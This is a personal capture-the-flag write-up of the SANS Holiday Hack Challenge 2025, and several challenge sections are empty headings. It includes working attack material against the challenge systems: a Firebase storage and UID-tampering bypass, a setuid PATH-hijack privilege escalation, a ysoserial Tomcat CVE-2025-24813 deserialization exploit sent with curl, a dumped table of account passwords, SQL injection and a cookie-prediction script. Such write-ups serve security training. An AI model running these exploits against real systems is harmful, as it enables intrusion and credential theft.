# SANS Holiday Hack Challenge 2025

Return of the Dosis Neighborhood. Now in optional isometric style!

Challenges:

**ACT I**

- [Holiday Hack Orientation](#holiday-hack-orientation)
- [Its All About Defang](#its-all-about-defang)
- [Neighborhood WAtch Bypass](#neighborhood-watch-bypass)
- [Santa's Gift-Tracking Service Port Mystery](#santas-gift-tracking-service-port-mystery)
- [Visual Networking Thinger](#visual-networking-thinger)
- [Visual Firewall Thinger](#visual-firewall-thinger)
- [Intro to Nmap](#intro-to-nmap)
- [Blob Storage Challenge in the Neighborhood](#blob-storage-challenge-in-the-neighborhood)
- [Spare Key](#spare-key)
- [The Open Door](#the-open-door)
- [Owner](#owner)

**Act II**

- [Retro Recovery](#retro-recovery)
- [Mail Detective](#mail-detective)
- [IDORable Bistro](#idorable-bistro)
- [Dosis Network Down](#dosis-network-down)
- [Rogue Gnome Identity Provider](#rogue-gnome-identity-provider)
- [Quantgnome Leap](#quantgnome-leap)
- [Going in Reverse](#going-in-reverse)


**Act III**

- [Gnome Tea](#gnome-tea)
- Hack-a-Gnome (incomplete)
- [Snowcat RCE & Priv Esc](#snowcat-rce--priv-esc)
- [Schrodinger's Scope](#schrodingers-scope)
- [Find and Shutdown Frosty's Snowglobe Machine](#schrodingers-scope)
- On the Wire (Incompelete)
- Free Ski (incomplete)


# Detailed Solutions

## Holiday Hack Orientation
## Its All About Defang
## Neighborhood WAtch Bypass
## Santa's Gift-Tracking Service Port Mystery
## Visual Networking THinger
## Visual Firewall Thinger
## Intro to Nmap
## Blob Storage Challenge in the Neighborhood
## Spare Key

## The Open Door

### Background
### Hints
### Solution

[Return to top](#sans-holiday-hack-challenge-2025)


## Owner

### Background
### Hints
### Solution

[Return to top](#sans-holiday-hack-challenge-2025)


## Retro Recovery

### Background
### Hints
### Solution

[Return to top](#sans-holiday-hack-challenge-2025)


## Mail Detective

### Background
### Hints
### Solution

[Return to top](#sans-holiday-hack-challenge-2025)


## IDORable Bistro

### Background
### Hints
### Solution

[Return to top](#sans-holiday-hack-challenge-2025)


## Dosis Network Down

### Background
### Hints
### Solution

[Return to top](#sans-holiday-hack-challenge-2025)

## Rogue Gnome Identity Provider

### Background
### Hints
### Solution

[Return to top](#sans-holiday-hack-challenge-2025)

## Quantgnome Leap

### Background
### Hints
### Solution

[Return to top](#sans-holiday-hack-challenge-2025)

## Going in Reverse

### Background
### Hints
### Solution

[Return to top](#sans-holiday-hack-challenge-2025)

## Gnome Tea
Enter the apartment building near 24-7 and help Thomas infiltrate the GnomeTea social network and discover the secret agent passphrase.

I loved how this challenge took shape.  I had my head in the sand so missed the comrpomise of the Tea website.  Loved how the the gome tea icon and color scheme was gnomified copy of the tea icon and site.

### Background

***Thomas Bouve***
Hi again. Say, you wouldn't happen to have time to help me out with something?

The gnomes have been oddly suspicious and whispering to each other. In fact, I could've sworn I heard them use some sort of secret phrase. When I laughed right next to one, it said "passphrase denied". I asked what that was all about but it just giggled and ran away.

I know they've been using GnomeTea to "spill the tea" on one another, but I can't sign up 'cause I'm obviously not a gnome. I could sure use your expertise to infiltrate this app and figure out what their secret passphrase is.

I've tried a few things already, but as usual the whole... Uh, what's the word I'm looking for here? Oh right, "endeavor", ended up with the rest of my unfinished projects.

### Hints

- Exif jpeg image data can often contain data like the latitude and longitude of where the picture was taken.
- Hopefully they setup their firestore and bucket security rules properly to prevent anyone from reading them easily with curl. There might be sensitive details leaked in messages.
- I heard rumors that the new GnomeTea app is where all the Gnomes spill the tea on each other. It uses Firebase which means there is a client side config the app uses to connect to all the firebase services.

### Solution

First hint, when we look at the source of the https://gnometea.web.app/login app we can see some comments:

    <!-- TODO: lock down dms, tea, gnomes collections -->

If we try to login we get a Firebase error

![alt text](images/gnometea/loginerror.png)

We can also examine the client side javascript file which reveals some API keys and the firebase project

![alt text](images/gnometea/Clientsidevalues.png)

Through some additiona research we learn that you can access insecure firestore databases with just the project name

```
curl  'https://firestore.googleapis.com/v1/projects/holidayhack2025/databases/(default)/documents/dms'

curl  ' https://firestore.googleapis.com/v1/projects/holidayhack2025/databases/(default)/documents/tea'

curl  'https://firestore.googleapis.com/v1/projects/holidayhack2025/databases/(default)/documents/gnomes'
```

This is a gold mine of information.

The important finds are:

Conversation between Glitch Mitnick and Barnaby Briefcase where Barnaby says:
> Sorry, I can't give you my password but I can give you a hint. My password is actually the name of my hometown that I grew up in. I actually just visited there back when I signed up with my id to GnomeTea (I took my picture of my id there)

In the gnomes endpoint we also have refernces to a storage endpoint that holds the images of the drivers license. Unfortunatly for us the only drivers license we cannot access is Barnaby's.

Doing some research there is apparently legacy storage URLs that can be referenced instead  So instead of:

https://storage.googleapis.com/holidayhack2025.firebasestorage.app/gnome-documents/l7VS01K9GKV5ir5S8suDcwOFEpp2_drivers_license.jpeg

We can use:

https://firebasestorage.googleapis.com/v0/b/holidayhack2025.firebasestorage.app/o/gnome-documents%2Fl7VS01K9GKV5ir5S8suDcwOFEpp2_drivers_license.jpeg?alt=media

Which lets us access the file:

![alt text](images/gnometea/drivers_license.png)

Since Barnaby said he took this picture in his home town which is also a clue to his password we'll check the exif data:
```
exif license.jpg
EXIF tags in 'license.jpg' ('Motorola' byte order):
--------------------+----------------------------------------------------------
Tag                 |Value
--------------------+----------------------------------------------------------
Manufacturer        |Toadstool Inc.
Model               |Glimmerglass Pro
X-Resolution        | 0
Y-Resolution        | 0
Resolution Unit     |Internal error (unknown value 1)
Artist              |Pip Sparkletoes Photography
YCbCr Positioning   |Centered
Copyright           |Property of the Gnome Secret Service (GSS) (Photographer)
Exif Version        |Exif Version 2.1
FlashPixVersion     |FlashPix Version 1.0
Color Space         |Uncalibrated
GPS Tag Version     |2.3.0.0
North or South Latit|S
Latitude            |33, 27, 53.8505
East or West Longitu|E
Longitude           |115, 54, 37.6197
--------------------+----------------------------------------------------------
```

if we convert the Latitude and Longitude to Degrees Minutes and Seconds for input into Google Maps we get a location in google maps with a gnomerelated name nearby "gnomesville car park"

![alt text](images/gnometea/gnomesville.png)

Now we can log into ghometea with the username barnabybriefcase@gnomemail.dosis and password gnomesville.

But the admin page is still out of reach.

![alt text](images/gnometea/admindenied.png)

Looks like we need to have the UID:  3loaihgxP0VwCTKmkHHFLe6FZ4m2

The current UID is stored in the local Storage IndexDB Firebaselocalstorage

![alt text](images/gnometea/localstorage.png)

I can change this value using a code snippet in developer tools.  The snippet should be run wile viewing the /admin page.

```
// Open the IndexedDB database
const request = indexedDB.open("firebaseLocalStorageDb");

request.onsuccess = function (event) {
   //const db = req.result;
   const db = event.target.result;
   const tx = db.transaction('firebaseLocalStorage', 'readwrite');
   //console.log("Object stores:", db.objectStoreNames);
   const store = tx.objectStore('firebaseLocalStorage');
   //console.log(store)
   // Get the existing record
   const getReq = store.get('firebase:authUser:AIzaSyDvBE5-77eZO8T18EiJ_MwGAYo5j2bqhbk:[DEFAULT]');
    

   getReq.onsuccess = function () {
        const data = getReq.result;

        if (!data) {
            console.log("Record not found");
            return;
        }

        // Modify the UID
        data.value.uid = "3loaihgxP0VwCTKmkHHFLe6FZ4m2";

        // Save it back
        const putReq = store.put(data);

        putReq.onsuccess = function () {
            console.log("Successfully escalated to admin user 3loaihgxP0VwCTKmkHHFLe6FZ4m2");
        };

        putReq.onerror = function (err) {
            console.error("Error updating record:", err);
        };
    };

    getReq.onerror = function (err) {
        console.error("Error reading record:", err);
    };
};
```

![alt text](images/gnometea/snippet.png)

output:  Successfully escalated to admin user 3loaihgxP0VwCTKmkHHFLe6FZ4m2

![alt text](images/gnometea/flag.png)


[Return to top](#sans-holiday-hack-challenge-2025)

## Snowcat RCE & Priv Esc

This one took me quite a bit of time.

**References that helped**
- This was a good analysis: https://attackerkb.com/topics/4GajxQH17l/cve-2025-24813
- This helped me get focus on a command Class that is broadly compatible https://deepwiki.com/Y4er/ysoserial/5.2-memory-shell-injection
- This helped to further narrow down a command Class that would work and help me interpret the errors:  Testing and exploiting Java Deserialization - AFINE - digitally secure

### Background

Tom, in the hotel, found a wild Snowcat bug. Help him chase down the RCE! Recover and submit the API key not being used by snowcat.

***From Tom:***
There are a couple of vulnerabilities in the snowcat and weather monitoring services that we haven't gotten around to fixing.

Can you help me exploit the vulnerabilities and retrieve the other application's authorization key?

Enter the other application's authorization key into the badge.

If Frosty's plan works and everything freezes over, our customers won't be having the best possible experience—they'll be having the coldest possible experience! We need to stop this before the whole neighborhood becomes one giant freezer.

### Hints

- Maybe we can inject commands into the calls to the temperature, humidity, and pressure monitoring services.
- If you're feeling adventurous, maybe you can become root to figure out more about the attacker's plans.
- Snowcat is closely related to Tomcat. Maybe the recent Tomcat Remote Code Execution vulnerability (CVE-2025-24813) will work here.

### Solution

To get the flag you only need to perform direct privilege escalation.  The Tomcat(Snowcat) RCE is optional but cool

For the Priv Esclation, through some simple scopign you'll identify the Snowcat Java Server Pages stored in the user directory.  These reference files in the /usr/local/weather folder and specifically the following:

- /usr/local/weather/humidity
- /usr/local/weather/pressure
- /usr/local/weather/temperature

These files all ahve -rwsr-s-r-x privileges adn are owned by root and group weather. Anyone in in the Other group is able execute these as the root user due to the SETUID and SETGID. If we can abuse these binaries to access the keys/ folder we whould be able to find something related to the keys that Tom is looking for.

I tried many approaches to the abusing these binaries by various command injection attempts.  What finally worked was:
1. clearing the path environment variable.  export path=
2. Running the temperature binary with the static key extracted from the Snowcat JSP pages that were on disk.  This revealed errors referencing date and mkdir.  So we can assume that the temperature binary is directly calling date and mkdir as the owner user.  So if we can modify the path and provide our own versions of these tools we can have our commands executed as root.  
3.  Create the payload in our actor date file
```
cd /tmp
echo =e '#!/bin/sh\n/bin/cat /usr/local/weather/keys/authorized_keys > /tmp/flag.txt\n/bin/chmod 777 /tmp/flag.txt' > date
chmod +x date
/usr/local/weather/temperature 4b2f3c2d-1f88-4a09-8bd4-d3e5e52e19a6
cat /tmp/flag/txt  
```
4. This will output 2 flags and you can enter the one that isn't 4b2f3c2d-1f88-4a09-8bd4-d3e5e52e19a6 into the challenge submission field.

For the Snow cat RCE

The most important take away I had was understanding the session ID can be anything and is how we reference the payload in the follow up Get request to execute payload.  

Further reading narrowed down how to interpret the errors and eventually get to a working payload delivery method.  

This was done using the CommonCollections7 class.  There was also limitations in the commands I could send. Such as not being able to use a redirect...

So the what I call a working solution was:

```
java -jar ysoserial.jar CommonsCollections7 "chmod -R o+rx /usr/local/snowcat" > payload.bin

export HOST=localhost
export PORT=80
export SESSION_ID=evilsession27

curl -X PUT \
  -H "Host: ${HOST}:${PORT}" \
  -H "Content-Length: $(wc -c < payload.bin)" \
  -H "Content-Range: bytes 0-$(($(wc -c < payload.bin)-1))/$(wc -c < payload.bin)" \
  --data-binary @payload.bin \
  "http://${HOST}:${PORT}/${SESSION_ID}/session"

 curl -X GET \
  -H "Host: ${HOST}:${PORT}" \
  -H "Cookie: JSESSIONID=.${SESSION_ID}" \
  "http://${HOST}:${PORT}/"
```

This change the permissions on the /usr/local/snowcat directory so I could get access.  I used the access to pull accounts out of the SQLite database.

```
sqlite3 /usr/local/snowcat/webapps/ROOT/WEB-INF/classes/weather.db
sqlite> SELECT * FROM users;
admin|W34therBC0ld!154!37!|Weather|Admin
ed|eY5+6hJ9wDhE+Le9vi9JVIf5YP4OAWR7HfbRi5tG|Ed|S
josh|YUCH+VOeVJzbt8qt5sPnYLssmz60rosUwS0LfRAR|Josh|W
lynn|c3roIHsci3X1Dh7B7hdXtpfJcBWiQrxWqq9LrxOK|Lynn|S
patrick|5kiKq4ebUWxxbhrEPji01QcV5kYUKin4zBSPiOcu|Patrick|C
paul|5Pvf20wfDVXcQ9jgv96Z6k7EoGm28M8BeK1PKcat|Paul|B
evan|4X07MTdPmk53RFFKBFZWyBovCnU6SkRDUNOLkWcE|Evan|B
thomas|DndrOnRSN4Kw0S/mSqD87G6GqUmmCZMHzfM09/KB|Thomas|B
chrisd|bT1sgRXrZEsIZytHMH7qhE51ieDPRwy+ML7Hnkc6|Chris|D
mark|qJxO+4BBySvqbpxfmNv0+dxJlAR1uXvgYXOkb4Ns|Mark|D
chrise|2useB6f9c14tlhqhrXOwSJj1FA2p5O7ywuHxpQL7|Chris|E
jared|Hdd0ngscc5XP6B8qvsWiDsPi6D31jd6tCZd6Nkn0|Jared|F
charlie|elrBun7XQdrj5nIXeZIVc+Ig11ESsTarl/tqlOBH|Charlie|G
tom|rdv/5wQAA55PkJY45emvhb0lk2fGx4nJL7h/qJqN|Tom|H
jj|aTYyYgbc3zSBPqJ7B2B2wQgyTRL4EpRw7Z0W6SqJ|Janusz|J
kevin|anaEQN2ptzRrv6sN06aoYs3Nu4YjpG4nEE+DGCnC|Kevin|M
torkel|fFZE44+eIcigZOoOuDwK7QqtBQNWhn/pp5tOE076|Torkel|O
kyle|GDFysqKvLRV4dkXBCfImxlPtF/AxB0igkVyA6l8W|Kyle|P
eric|OUQ1vSH7eZkZ/6UnImrMUqjK/FdFwzyfgqJrsxLM|Eric|P
```

Then confirmed that we could login to the snowcat server

curl -i -X POST --location -b cookies.txt -d "username=admin&password=W34therBC0ld%21154%2137%21" http://localhost/login.jsp



Used this to open up permissions on the /usr/local/snowcat directory with chmod 0+rx and query the sqlite database for the user accounts.  With this I could log into the snowcat portal.  There was likely a memory shell option I could have tried but as I had something working and knew what I wanted I just sent a few commands until I achieved the goal.
```
<html>
<head>
    <title>Neighborhood Weather Monitoring Station</title>
    <link rel="stylesheet" type="text/css" href="styles.css">
</head>
<body>
<div class="dashboard-container">
    <h1>Neighborhood Weather Monitoring Station</h1>
    <p>Providing real-time Neighborhood weather monitoring since 2022.</p>
    <h2>Welcome, Weather Admin</h2>
<p>Likelihood of snow: <strong>High</strong></p>
<p>Temperature: 1.48 °C</p>
<p>Humidity: 60.0 %</p>
<p>Pressure: 982 hPa</p>

</div>
<script src="snowflakes.js"></script>
</body>
</html>
```








[Return to top](#sans-holiday-hack-challenge-2025)

## Schrodinger's Scope

### Background

Kevin in the Retro Store ponders pentest paradoxes—can you solve Schrödinger's Scope?

**NPC help from Kevin

The Neighborhood College Course Registration System has been getting some updates lately and I'm wondering if you might help me improve its security by performing a small web application penetration test of the site.

For any web application test, one of the most important things for the test is the 'scope', that is, what one is permitted to test and what one should not. While hacking is fun and cool, professional integrity means respecting scope boundaries, especially when there are tempting targets outside our permitted scope.

Thankfully, the Neighborhood College has provided a very concise set of 'Instructions' which are accessible via a link provided on the site you will be testing. Do not overlook or dismiss the instructions! Following them is key to successfully completing the test.

Unfortunately, those pesky gnomes have found their way into the site and have been causing some mischief as well. Be wary of their presence and anything they may have to say as you are testing.

Can you help me demonstrate to the Neighborhood College that we know what responsible penetration testing looks like?

### Hints:

Schrödinger's Scope
From: Santa

During any kind of penetration test, always be on the lookout for items which may be predictable from the available information, such as application endpoints. Things like a sitemap can be helpful, even if it is old or incomplete. Other predictable values to look for are things like token and cookie values


Schrödinger's Scope
From: Santa

As you test this with a tool like Burp Suite, resist temptations and stay true to the instructed path.


Schrödinger's Scope
From: Santa

Though it might be more interesting to start off trying clever techniques and exploits, always start with the simple stuff first, such as **reviewing HTML source code and basic SQLi.**

### Solution

More then anything, following the hints, and listehing to the Rogue gnome were the best tips for accomplishing this challange. That does mean exploring outside of scope just to get some intel as a different identity. On top of that using browser based developer tools and burp to manipulate the requests and responses to identify the vulnerabilities.

Before gettign too far, we want to ensure we don't trigger scope violations.  There is a mini gnome loaded into the page from an out of scope source that will burn our scope attmpts.

**Vulnerabilities**

1. Uncover Developer Information

Following the gnomes advice and looking at the available endpoints/urls, we can attempt to apply similar endpoints in in-scope areas.

So if we try visiting /register/dev/dev_todos?id=mypersonalid1, we can see details on some potential header enforcement, and that the teststudent account was updated to use password '2025h0L1d4y5'

![alt text](images\schrodinger\vuln1.png)

2. Exploited Information Disclosure via login

If we try the recently discovered updated credentials for teststudent in the /register/login form we get output that says missing **Invalid Forwarding IP**.  Based on the dev note about enforcing headers, we add the value X-Fowarded-For: 127.0.0.1 to the header in Burp suite request and send the login again.  This gets us to teh Course Selection view and identifes the second vulnerability.

![alt text](images\schrodinger\vuln2.png)

3. Found Commented-out Course Search

In this response if we listen to the ghome, and inspect the HTML, we see some commented text.  
![alt text](images\schrodinger\commented.png)
If you jump back to the burp and while intercepting the response, remove the commented text and forard the response we'll reveal the course search.
I used an override in chrome to permenantly replace the /register/courses/search with a local copy so I did't have to fiddle with Burp ensure the search function was uncommented.

4. Identified SQL Injection vulnerability

We can lookup different courses by entering a number between 1 and 999.  But it would be helpful to have a class list of which there does not appear to be one. If we try to SQL injection in this form will it work?

inputing 1' OR 1=1 -- results in the full course list.

![alt text](images\schrodinger\vuln4.png)

5. Reported the unauthorized ghome course

Reviewing the courses we see a course called GNOME 827 - Mischeif Management that was not identified when enumerating other courses with teh standard form. Cilcking on this course reveals another vulnerability whereby Gnomes were ablae add their own course content and conceal it form the primary search.  Report the vulnerability and you'll receive credit for another vulnerability.

![alt text](images\schrodinger\vuln5.png)

6. Hidden Course found via cookie prediction



We can find a hidden course by checkign under /register/dev/dev/notes which states that the new course, holiday_behavior is still wip (work-in-progress).  then navigate to 

https://flask-schrodingers-scope-firestore.holidayhackchallenge.com/register/courses/wip/holiday_behavior/?id=7e4766dc-23ce-452b-9b8c-cc536db4ed7f

However this returns an Invalid Session registration value. 
![alt text](images\schrodinger\invalidregvalue.png)

 If we Check our cookies there is a registration token that was set after we initially logged in.  If we watch this token it changes each time we we get a response. Only the last 2 characters change each time.  On top of that it appears that there isn't too much variety in the possible values of the 2 characters.

 So created a script to request the last 2 hex values and convert to Ascii characters. 

 ```

BASE="Schrodinger=e46dbe27-6dbe-463f-ab57-11683a4ac31c; registration=eb72a05369dcb4"   # everything before the last 2 hex characters
for i in {0..255}; do
    #Execute curl command grabbign the headers and droppign the body and save to RESPONSE
    RESPONSE=$(curl -s -D - -o /dev/null \
    #Include our cookie string (just the Schrodinger key)
    -b 'Schrodinger=e46dbe27-6dbe-463f-ab57-11683a4ac31c' \
     https://flask-schrodingers-scope-firestore.holidayhackchallenge.com/register/courses/search?id=7e4766dc-23ce-452b-9b8c-cc536db4ed7f)

    #Collect the cookies from the resposne
    SETCOOKIE=$(echo "$RESPONSE" | grep -i "^Set-Cookie:")
    
    #extract our registration cookie
    REG=$(echo "$SETCOOKIE" | sed -n 's/.*registration=\([^;]*\).*/\1/p')
    #take the last 2 digets from the registration cookie value
    LAST2="${REG: -2}"
    #convert the 2 diget hex value to ASCII
    ASCII=$(printf "\\x$LAST2")

    #Output
    echo "Registration cookie: $REG"
    echo "Last 2 hex chars: $LAST2"
    echo "ASCII: $ASCII"
 ```

Save the output to a file, so we can slice and dice

natha@ubuntuwsl:~/testing$ cat registrations.txt | grep ASCII | sort | uniq -c
     13 ASCII: B
     14 ASCII: C
     13 ASCII: D
     10 ASCII: E
     13 ASCII: F
     12 ASCII: G
     16 ASCII: H
     13 ASCII: I
     11 ASCII: J
     10 ASCII: K
     13 ASCII: M
     14 ASCII: N
     14 ASCII: O
     12 ASCII: P
     15 ASCII: Q
     12 ASCII: R
     12 ASCII: S
     14 ASCII: T
     11 ASCII: U
     14 ASCII: V


so the missing letters are ALWXYZ  

A 41
L 4c  
W 57
X 58
Y 59
Z 5a

If we test the hex digits in in the full registration cookie string eb72a05369dcb4## we can confirm that 4c allows us to see the hidden course



https://flask-schrodingers-scope-firestore.holidayhackchallenge.com/register/courses/wip/holiday_behavior/?id=7e4766dc-23ce-452b-9b8c-cc536db4ed7f

We can also enumerate all courses to see what gets returend.  Spoiler, it's not much of interest.

![alt text](images\schrodinger\hiddencourse.png)

This allows you to complete the vulnerability challenge without triggering any scope violations

![alt text](images/schrodinger/completion.png)

[Return to top](#sans-holiday-hack-challenge-2025)

## Find and Shutdown Frosty's Snowglobe Machine

### Background
You've heard murmurings around the city about a wise, elderly gnome having a change of heart. He must have information about where Frosty's Snowglobe Machine is. You should find and talk to the gnome so you can get some help with how to make your way through the Data Center's labrynthian halls.

Once you find the Snowglobe Machine, figure out how to shut it down and melt Frosty's cold, nefarious plans.

**NPC help from Elderly Gnome:**

A change of heart, I have had, yes. Among the gnomes plotting to freeze the neighborhood, I once was. Wrong, we are. Help you now, I shall.

The route to the old secret lab inside the Data Center, begins on the far East wing inside the building, it does. Pitch dark, the hallways leading to it probably are, hmm.

A code outside the building, the employees who once worked there left, yes. A reminder of the route, it serves. Search in the vicinity of the Data Center for this code, perhaps you can.

A story I recall, yes. Another computer person like yourself, ten years ago there was. Lost inside the Data Center, an intern had become. Found, they were, by this person. But before the reconstruction, that was. Exactly the same, the current route likely is not, hmm.

Search for the Data Center's past in the historical archives of the Internet, you should. More information helpful to you, may be found there, yes.

### Hints:

A Code in the Dark, You Must Find
From: Elder Gnome
The Elder Gnome said the route to the old secret lab inside the Data Center starts on the far East wing inside the building, and that the hallways leading to it are probably pitch dark. He also said the employees that used to work there left some kind of code outside the building as a reminder of the route. Perhaps you can search in the vicinity of the Data Center for this code.

Backwards, You Should Look
From: Elder Gnome
The Elder also recalled a story of another "computer person" like yourself who managed to find an intern that got lost inside the Data Center about 10 years ago. But that was before the reconstruction, so the current route likely isn't exactly the same. Maybe you can search for the Data Center's past in the historical archives that is the Internet for more information that may be helpful.

### Solution:

Step 1 Find the route to the secret lab.  Since I had already found the path to the Hack-a-gnome and to my knowledge there were no other branches from that route we would start there
![alt text](images/frostyglobe/globestep1.png)

You may have to fumble around a bit in the dark to get to the next as area, or just zoom out so you can see where you are going.  you want to go towards teh room with many doors.

The first thing to note is that there are doors with arrows and the letters A and B.  Pick any door and it will take you to the first room.  From here you need to the path correct or you will you will be leaving the datacenter and will have a long trudge to get back to the doors. So brute forcing is for the incredibly patient.  
![alt text](images/frostyglobe/bigpicture.png)
The hint offered the suggested to look into the internet past.  While I could find a reference in teh wayback machine, the fastest solution was to just look at the archive of previous hack challenges and review the past writupes.  I used [Michael Pella's](https://www.holidayhackchallenge.com/2015/assets/michael_pella.pdf) writeup to explain the original path which as based on the Konami code.  Since we now have the letters A and B as options above the door we can use that too.  Also recommend that you change the orientation so that up is pointing North for consistency and to more closely mirror the eralier Dosis neighborhood map.  We will also reverse the Konami code following the cluse from teh Elderly Gnome

Full route:  A, B, right, left, right, left, down, down, up, up

![alt text](images/frostyglobe/frostyfinal.png)

You can take the exit in the top left. At the time I reached the Frosty's lab there were no further actions available once you reached frosty.

###False Flags###
Code out side the building.  I tried turning the patterns on the brick into Binary and converting to ascii.  But never figured out if this was applicable to the challenge.
![alt text](images/frostyglobe/datacenteroutside.png)

[Return to top](#sans-holiday-hack-challenge-2025)